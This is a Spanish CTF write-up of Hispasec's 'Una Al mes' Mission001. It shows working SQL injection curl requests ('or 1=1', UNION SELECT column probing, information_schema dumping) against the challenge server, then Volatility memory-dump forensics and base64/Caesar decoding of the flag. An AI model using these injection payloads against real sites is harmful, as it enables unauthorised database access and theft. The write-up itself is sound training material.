---
title: "Write-up – CTF: Una Al mes #Mission001 – SQLi / Forensics / Crypto"
author: Jose M
classes: wide
excerpt: "El pasado 15 de Noviembre se presento el primer reto CTF de Una Al mes de Hispasec. Aquí traemos el write-up y aunque era sencillo, nosotros hemos aprendido mucho con él así que esperamos que os guste."
categories:
  - Pentest
tags:
  - Forencsics
  - Criptografía
  - CTF
---
El pasado 15 de Noviembre se presento el primer reto *CTF* de [Una Al mes](http://unaaldia.hispasec.com/2017/11/quieres-jugar-un-juego-demuestra-tus.html) de Hispasec. Aquí traemos el *write-up *y aunque era sencillo, nosotros hemos aprendido mucho con él así que esperamos que os guste.
{: style="text-align: justify;"}

[![Descripción CTF - Write-up Una Al mes #Mission001](https://donttouchmy.net/wp-content/uploads/2017/11/Screenshot-2017-11-30-Mission001-300x177.jpg "Descripción CTF - Write-up Una Al mes #Mission001")](https://donttouchmy.net/wp-content/uploads/2017/11/Screenshot-2017-11-30-Mission001.jpg)

Descripción CTF -- Write-up Una Al mes #Mission001

Accedemos a la URL que nos facilitan donde nos cuentan la misión.

Objetivo: Buscar prueba incriminatoria de que están haciendo algo malo en una empresa farmacéutica.

Nos facilitan una URL de un supuesto equipo interno: http://34.253.233.243/form1.php

[![Página inicio CTF - Write-up Una Al mes #Mission001](https://donttouchmy.net/wp-content/uploads/2017/11/Screenshot-2017-11-30-Pharma-Corp-DB-300x177.jpg "Página inicio CTF - Write-up Una Al mes #Mission001")](https://donttouchmy.net/wp-content/uploads/2017/11/Screenshot-2017-11-30-Pharma-Corp-DB.jpg)

Página inicio CTF -- Write-up Una Al mes #Mission001

Aquí encontramos un buscador. Este buscado a priori no devuelve nada al introducir una cadena de caracteres al azar. Haciendo pruebas vemos que al introducir «1»  si que nos devuelve un resultado.
{: style="text-align: justify;"}
```
ID: 1 - NAME: MORPHINE - STOCK: 500
```
#### Comprobando si es vulnerable a SQLi

El primer paso es comprobar si la aplicación es vulnerable a  *SQLi*.
```
# curl --data "search_text=' or 1=1 --" http://34.253.233.243/search1.php
 ID: 1 - NAME: MORPHINE - STOCK: 500</br>ID: 2 - NAME: ANALGESIC - STOCK: 800</br>ID: 3 - NAME: CHLORIDE ACID - STOCK: 200</br>ID: 4 - NAME: COLLAGEN - STOCK: 450</br>ID: 5 - NAME: MAGNESIUM - STOCK: 450</br>ID: 6 - NAME: VOLTADOL - STOCK: 675</br>ID: 7 - NAME: FORTASEC - STOCK: 555</br>ID: 8 - NAME: DULCOLAXO - STOCK: 390</br>ID: 9 - NAME: VENORUTON - STOCK: 690</br>ID: 10 - NAME: FLUIMOCIL - STOCK: 980</br>ID: 11 - NAME: UTABON - STOCK: 630</br>ID: 12 - NAME: THROMBOCID - STOCK: 720</br>ID: 13 - NAME: LIZIPADOL - STOCK: 661</br>ID: 14 - NAME: HEMOCLIN - STOCK: 270</br>ID: 15 - NAME: FISIOCREM - STOCK: 140</br>ID: 16 - NAME: EPAPLUS - STOCK: 300</br>ID: 17 - NAME: ALMAX - STOCK: 400</br>ID: 18 - NAME: GAVISCON - STOCK: 510</br>ID: 19 - NAME: CLARIYTINE - STOCK: 50</br>ID: 20 - NAME: CINFATOS - STOCK: 860</br>ID: 21 - NAME: AZARON - STOCK: 330</br>ID: 22 - NAME: JUANOLA - STOCK: 830</br>ID: 23 - NAME: DICLODOLOR - STOCK: 190</br>ID: 24 - NAME: AZOL - STOCK: 300</br>ID: 25 - NAME: SYSTANE - STOCK: 400</br>ID: 26 - NAME: VIAGRA - STOCK: 300</br>ID: 27 - NAME: ACICLOVIR - STOCK: 200</br>
```
Esto es por que después de hacer pruebas vemos que sólo devuelve resultado si introducimos un número entre 1 y 26, que corresponde al id del producto. También si introducimos el nombre del medicamento completo. Así que deducimos que la clausula *WHERE* es algo tal que así:
{: style="text-align: justify;"}
```
*WHERE ID = $ID OR NAME = $NAME;*
```
Con nuestro *input* ***' or 1=1 ---***, creamos la clausula:
```
*WHERE ID = '' or 1=1  -- OR NAME = $NAME;*
```
Con *-- --* le decimos que todo lo que venga después de *1=1*, es un comentario y queda descartado. También podríamos haber usado ***' or 1=1 or '***.

Ahora que sabemos que es vulnerable a *SQLi* , vamos a sacar toda la información posible, pero para poder extraer la información vamos a usar el operador *UNION* para encadenar sentencias *SQL*.
{: style="text-align: justify;"}

Antes de seguir, hay que averiguar cuantas columnas devuelve la *query* original y devolver el mismo número de columnas en la segunda *query* para que *UNION *pueda contruir el resultado final.
{: style="text-align: justify;"}
```
# curl --data "search_text=' or 1=1 UNION SELECT 1-" http://34.253.233.243/search1.php
# curl --data "search_text=' or 1=1 UNION SELECT 1 -" http://34.253.233.243/search1.php
# curl --data "search_text=' or 1=1 UNION SELECT 1,2 -" http://34.253.233.243/search1.php
# curl --data "search_text=' or 1=1 UNION SELECT 1,2,3 -" http://34.253.233.243/search1.php
...,ID: 1 - NAME: 2 - STOCK: 3</br>
```
Como veis la última nos devuelve resultado, así que ya sabemos como construir la sentencia después de *UNION*.
{: style="text-align: justify;"}

#### **Extrayendo bases de datos, tablas y columnas.**

Sabiendo que la información relativa a la estructura de base de datos de* MySQL* se  guarda en la base de datos interna con nombre *information_schema, *podemos comprobar si la aplicación corre sobre este *SGBD*.*\
*Para esto usaremos la *subquery*:
```
select group_concat(c.COLUMN_NAME,'-',c.TABLE_NAME,'-',c.TABLE_SCHEMA) from information_schema.COLUMNS c
```
Aquí decimos, devuélveme agrupados los valores COLUMN_NAME, TABLE_NAME y TABLE_SCHEMA de la tabla *information_schema.COLUMNS*.
{: style="text-align: justify;"}

La petición final con la *subquery* quedaría así:
```
# curl --data "search_text=' or 1=0 UNION SELECT 1,(select group_concat(c.COLUMN_NAME,'-',c.TABLE_NAME,'-',c.TABLE_SCHEMA) from information_schema.COLUMNS c ),3 --" http://34.253.233.243/search1.php;echo
ID: 1 - NAME: ID-CLIENTS-PHARMA_CORP,NAME-CLIENTS-PHARMA_CORP,ID-PRODUCTS-PHARMA_CORP,NAME-PRODUCTS-PHARMA_CORP,STOCK-PRODUCTS-PHARMA_CORP,ID-SECRET-PHARMA_CORP,FLAG-SECRET-PHARMA_CORP,PLUGIN_NAME-ALL_PLUGINS-information_schema,PLUGIN_VERSION-ALL_PLUGINS-information_schema,PLUGIN_STATUS-ALL_PLUGINS-information_schema,PLUGIN_TYPE-ALL_PLUGINS-information_schema,PLUGIN_TYPE_VERSION-ALL_PLUGINS-information_schema,PLUGIN_LIBRARY-ALL_PLUGINS-information_schema,PLUGIN_LIBRARY_VERSION-ALL_PLUGINS-information_schema,PLUGIN_AUTHOR-ALL_PLUGINS-information_schema,PLUGIN_DESCRIPTION-ALL_PLUGINS-information_schema,PLUGIN_LICENSE-ALL_PLUGINS-information_schema,LOAD_OPTION-ALL_PLUGINS-information_schema,PLUGIN_MATURITY-ALL_PLUGINS-information_schema,PLUGIN_AUTH_VERSION-ALL_PLUGINS-information_schema,GRANTEE-APPLICABLE_ROLES-information_schema,ROLE_NAME-APPLICABLE_ROLES-information_schema,IS_GRANTABLE-APPLICABLE_ROLES-information_schema,IS_DEFAULT-APPLICABLE_ROLES-information_schema,CHARACTER_SET_NAME-CHARACTER_SETS-information_schema,DEFA - STOCK: 3</br>
```
En el listado de columnas, podemos ver que hay las tabla *SECRETS* con una columna *FLAGS*:
```
*...,ID-SECRET-PHARMA_CORP,FLAG-SECRET-PHARMA_CORP,...*
```
Así que vamos a sacar el contenido de la columna *FLAG* de la tabla *SECRET*:
```
# curl --data "search_text=' or 1=0 UNION SELECT 1,(select FLAG FROM SECRET LIMIT 1),3 --" http://34.253.233.243/search1.php;echo
 ID: 1 - NAME: https://mega.nz/#!R7RR2bRI!I_ZlZhMA4Il8UEU83sHe8XFIaQddevf6BRotv81aI34 - STOCK: 3</br>
```
Bingo! Descargamos el enlace en nuestro equipo.

#### Procesado de archivo en formato desconocido

El archivo se llama *secret.raw *y ocupa poco más de 1Gb. El comando *file *sólo nos dice que es del tipo *data**.*
```
# ls -lh secret.raw
-rw-r--r-- 1 root root 1.0G xim 15 21:48 secret.raw
# file secret.raw
secret.raw: data
```
Probamos con el comando *strings* a ver si en el contenido del archivo está la cadena UAM que es la *flag* que estamos buscando.
{: style="text-align: justify;"}
```
# strings secret.raw |grep UAM
UAM.pxe
3UAM,
MEDIUMAQUAMARINE
AQUAMARINE
UAM.pxe
UAM.pxe
```
No parece muy concluyente... Con *hexdump *o *xxd* revisamos un poco el tipo de archivo a ver si averiguamos de que tipo es.\
Vemos algunas referencias a NTFS y VirtaulBox así que pensamos que es algún tipo de imagen de disco, pero ni *testdisk *ni otras pruebas sacan ninguna partición utilizable ni tabla de particiones.
{: style="text-align: justify;"}
```
# testdisk /list secret.raw
TestDisk 7.0, Data Recovery Utility, April 2015
Christophe GRENIER <grenier@cgsecurity.org>
http://www.cgsecurity.org
Please wait...
Disk secret.raw - 1073 MB / 1023 MiB - CHS 131 255 63
Sector size:512

Disk secret.raw - 1073 MB / 1023 MiB - CHS 131 255 63
 Partition Start End Size in sectors
```
Así que si no es una imagen de disco, puede ser un dump de memoria. Lo comprobamos con *volatility.*
{: style="text-align: justify;"}
```
# volatility imageinfo -f secret.raw
Volatility Foundation Volatility Framework 2.6
INFO : volatility.debug : Determining profile based on KDBG search...
 Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
 AS Layer2 : FileAddressSpace (/root/Downloads/unaaldia/secret.raw)
 PAE type : No PAE
 DTB : 0x187000L
 KDBG : 0xf800028080a0L
 Number of Processors : 1
 Image Type (Service Pack) : 1
 KPCR for CPU 0 : 0xfffff80002809d00L
 KUSER_SHARED_DATA : 0xfffff78000000000L
 Image date and time : 2017-11-01 21:00:58 UTC+0000
 Image local date and time : 2017-11-01 22:00:58 +0100
```
Parece que, efectivamente, es un *memory dump* de Windows.
{: style="text-align: justify;"}

#### Procesado de volcado de memoria

En el paso anterior, el campo *Suggested Profile(s)* nos lista los posibles perfiles que podemos utilizar para procesar el *memory dump*. Los perfiles son los Símbolos de Sistema disponibles para dar formato al volcado de memoria.
{: style="text-align: justify;"}

Cuando estábamos revisando el *dump *con* hexdump *vimos referencias a Windows posteriores a Windows 7, así que vamos a utilizar el perfil *Win2008R2SP1x64.*
{: style="text-align: justify;"}

Para listar los procesos que se estaban ejecutando en el momento del volcado de memoria usamos el siguiente comando:
```
# volatility pslist -f secret.raw --profile=Win2008R2SP1x64
...
Volatility Foundation Volatility Framework 2.6
0xfffffa8002402950 soffice.exe 2528 2508 2 66 1 1 2017-11-01 20:59:11 UTC+0000
0xfffffa8001436b30 soffice.bin 2624 2528 10 294 1 1 2017-11-01 20:59:13 UTC+0000
...
```
El proceso que más llama la atención *Open Office.*
{: style="text-align: justify;"}

*volatility *nos permite ver los archivos abiertos con el comando *filescan*.
```
# volatility filescan -f secret.raw --profile=Win2008R2SP1x64
 ...

0x000000003ecbd9b0 15 0 R--rw- \Device\HarddiskVolume2\Users\unaalmes\Desktop\secret.ods
0x000000003ef4da00 2 1 RW-r-- \Device\HarddiskVolume2\Users\unaalmes\Desktop\secret.ods
0x000000003f646bc0 2 0 RW-rw- \Device\HarddiskVolume2\Users\unaalmes\Desktop\.~lock.secret.ods#

...
```
Entre todos los archivos vemos que hay un archivo *secret.ods*. Probamos a extraerlo mediante el comando *dumpfiles* de *volatility*. Aquí tenemos que indicar que archivos queremos extraer mediante el parámetro *--regex <PATRÓN>*.
{: style="text-align: justify;"}
```
# volatility dumpfiles -f ../secret.raw --profile=Win2008R2SP1x64 --dump-dir . --regex secret -u
```
Ahora podemos abrir los archivos .ods con OpenOffice. Si no tenemos la aplicación y no queremos instalarla podemos usar odt2txt para extraer el XML y revisarlo a mano.
{: style="text-align: justify;"}
```
# odt2txt file.2624.0xfffffa80021ba280.dat --raw > s.ods
# odt2txt file.2624.0xfffffa8001d4d010.vacb --raw > s2.ods
```
Sólo el *.dat* se puede procesar, así que  revisamos su contenido. Con *python *lo hacemos más ameno.
```
# cat s.ods | python -c 'import sys;import xml.dom.minidom;s=sys.stdin.read();print xml.dom.minidom.parseString(s).toprettyxml()'
```
Advertimos la siguiente información al final de todo:
```
...

 table:table-row table:style-name="ro1">
 <table:table-cell office:value-type="string" table:style-name="ce7">
 <text:p>EXPEDIENT KEY: V2taU2UzaGFhR2d6ZUhocmVsRmZaVEJ5WnpFelh6TmpWVE4zTVZKcVUzbDk=</text:p>
 </table:table-cell>
...
```
#### Extrayendo la flag

Por pura intuición (el formato, la longitud y el igual final de la cadena) nos hace pensar que quizás esté codificado en [*base64*](https://en.wikipedia.org/wiki/Base64). Lo decodificamos.
{: style="text-align: justify;"}
```
# echo -n "V2taU2UzaGFhR2d6ZUhocmVsRmZaVEJ5WnpFelh6TmpWVE4zTVZKcVUzbDk="|base64 -d
 WkZSe3haaGgzeHhrelFfZTByZzEzXzNjVT
```
Pero esto tampoco nos devuelve nada relevante. Comprobamos si es un *hash* con *hash-identifier *pero no obtenemos ningún resultado.
{: style="text-align: justify;"}
```
# hash-identifier
 #########################################################################
 # __ __ __ ______ _____ #
 # /\ \/\ \ /\ \ /\__ _\ /\ _ `\ #
 # \ \ \_\ \ __ ____ \ \ \___ \/_/\ \/ \ \ \/\ \ #
 # \ \ _ \ /'__`\ / ,__\ \ \ _ `\ \ \ \ \ \ \ \ \ #
 # \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \ \_\ \__ \ \ \_\ \ #
 # \ \_\ \_\ \___ \_\/\____/ \ \_\ \_\ /\_____\ \ \____/ #
 # \/_/\/_/\/__/\/_/\/___/ \/_/\/_/ \/_____/ \/___/ v1.1 #
 # By Zion3R #
 # www.Blackploit.com #
 # Root@Blackploit.com #
 #########################################################################

-------------------------------------------------------------------------
 HASH: WkZSe3haaGgzeHhrelFfZTByZzEzXzNjVTN3MVJqU3l9

Not Found.
```
Como no parece que sea un *hash*, simplemente probamos suerte volviendo a  decodificar en base64...
```
# echo -n "V2taU2UzaGFhR2d6ZUhocmVsRmZaVEJ5WnpFelh6TmpWVE4zTVZKcVUzbDk="|base64 -d|base64 -d
 ZFR{xZhh3xxkzQ_e0rg13_3cU3w1RjSy}
```
Y premio! Ya tenemos algo parecido a la bandera que buscamos! Aunque no cumple con el formato...

Con un simple análisis vemos que los tres primeros caracteres son el resultado de desplazar cada uno de los caracteres en 5 posiciones.\
Z -- 5 = U\
F -- 5 = A\
R -- 5 = M

A esto éste tipo cifrado se le llama [cifrado César](https://en.wikipedia.org/wiki/Caesar_cipher).
{: style="text-align: justify;"}

Vamos a descifrarlo. Nosotros hemos hecho un rápido *script* en *python* para procesar la cadena.
```
abc='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
A='ZFR{xZhh3xxkzQ_e0rg13_3cU3w1RjSy}'
B=""
for i in A:
    if i in abc:
        B+=abc[abc.index(i)-5]
    else:
        B+=i
print A
print B
```
Aquí construimos una cadena con el abecedario en mayúsculas y minúsculas y por cada carácter que aparece en la cadena lo desplazamos 5 posiciones negativas. El resto de caracteres se queda igual.
{: style="text-align: justify;"}
```
# python deciph.py
 ZFR{xZhh3xxkzQ_e0rg13_3cU3w1RjSy}
 UAM{sUcc3ssfuL_Z0mb13_3XP3r1MeNt}
```
Done!

Aquí os dejo el link del *write-up *oficial. Espero que hayáis aprendido algo.\
http://laboratorio.blogs.hispasec.com/2017/11/write-up-mission001.html